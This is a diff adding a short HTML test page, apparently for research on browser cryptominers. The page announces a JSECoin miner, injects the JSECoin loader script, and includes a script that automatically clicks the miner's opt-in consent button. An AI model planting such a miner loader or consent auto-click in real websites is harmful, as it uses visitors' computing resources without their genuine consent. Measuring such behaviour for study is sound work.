@@ -1,0 +1,19 @@
+<html>
+  <head>
+  </head>
+  <body>
+    <p>This site cointains a JSECoin miner</p>
+  <script type="text/javascript"> !function(){window.JSENoAds=1;var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/152818/senglehardt.com/0/0/",s.parentNode.insertBefore(t,s)}(); </script>
+  <script>
+    function autoOptIn() {
+      var node = document.evaluate('//b[contains(text(), "This site is supported by JSEcoin")]', document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
+      if (node === undefined) {
+        setTimeout(autoOptIn, 1000);
+      }
+      node.parentElement.parentElement.childNodes[5].childNodes[1].click();
+      return;
+    }
+    setTimeout(autoOptIn, 1000);
+  </script>
+  </body>
+</html>
